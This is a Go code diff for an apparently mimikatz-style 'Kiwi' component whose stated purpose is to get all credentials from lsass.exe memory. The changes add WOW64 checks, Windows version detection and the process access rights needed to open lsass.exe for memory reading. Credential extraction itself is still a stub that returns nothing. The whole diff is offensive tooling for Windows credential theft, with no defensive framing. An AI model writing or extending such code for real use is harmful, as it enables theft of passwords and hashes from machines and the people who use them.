@@ -6,6 +6,7 @@ import (
 	"sort"
 	"sync"
 
+	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
 	"project/internal/logger"
@@ -21,9 +22,21 @@ type Credential struct {
 type Kiwi struct {
 	logger logger.Logger
 
-	debug bool   // privilege
-	pid   uint32 // PID about lsass.exe
-	mu    sync.Mutex
+	// privilege
+	debug bool
+
+	// 0 = not read, 1 = true, 2 = false
+	wow64 uint8
+
+	// PID about lsass.exe
+	pid uint32
+
+	// about Windows version
+	major uint32
+	minor uint32
+	build uint32
+
+	mu sync.Mutex
 }
 
 // NewKiwi is used to create a new kiwi.
@@ -56,6 +69,15 @@ func (kiwi *Kiwi) EnableDebugPrivilege() error {
 
 // GetAllCredential is used to get all credentials from lsass.exe memory.
 func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
+	// check is running on WOW64
+	wow64, err := kiwi.isWow64()
+	if err != nil {
+		return nil, err
+	}
+	if wow64 {
+		return nil, errors.New("can't access x64 process")
+	}
+	// get lsass process handle
 	pid, err := kiwi.getLSASSProcessID()
 	if err != nil {
 		return nil, err
@@ -65,9 +87,28 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	if err != nil {
 		return nil, err
 	}
-	kiwi.logf(logger.Info, "Handle of lsass.exe is %d", pHandle)
-
+	defer api.CloseHandle(pHandle)
+	kiwi.logf(logger.Info, "Handle of lsass.exe is 0x%X", pHandle)
 	return nil, nil
+}
+
+func (kiwi *Kiwi) isWow64() (bool, error) {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.wow64 != 0 {
+		return kiwi.wow64 == 1, nil
+	}
+	var wow64 bool
+	err := windows.IsWow64Process(windows.CurrentProcess(), &wow64)
+	if err != nil {
+		return false, errors.Wrap(err, "failed to call IsWow64Process")
+	}
+	if wow64 {
+		kiwi.wow64 = 1
+	} else {
+		kiwi.wow64 = 2
+	}
+	return wow64, nil
 }
 
 func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
@@ -95,9 +136,23 @@ func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
 	return kiwi.pid, nil
 }
 
-func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
-	var da uint32
+func (kiwi *Kiwi) getWindowsVersion() (major, minor, build uint32) {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.major == 0 {
+		kiwi.major, kiwi.minor, kiwi.build = api.GetVersionNumber()
+	}
+	return kiwi.major, kiwi.minor, kiwi.build
+}
 
+func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
+	major, _, _ := kiwi.getWindowsVersion()
+	var da uint32 = windows.PROCESS_VM_READ
+	if major < 6 {
+		da |= windows.PROCESS_QUERY_INFORMATION
+	} else {
+		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
+	}
 	return windows.OpenProcess(da, false, pid)
 }
 
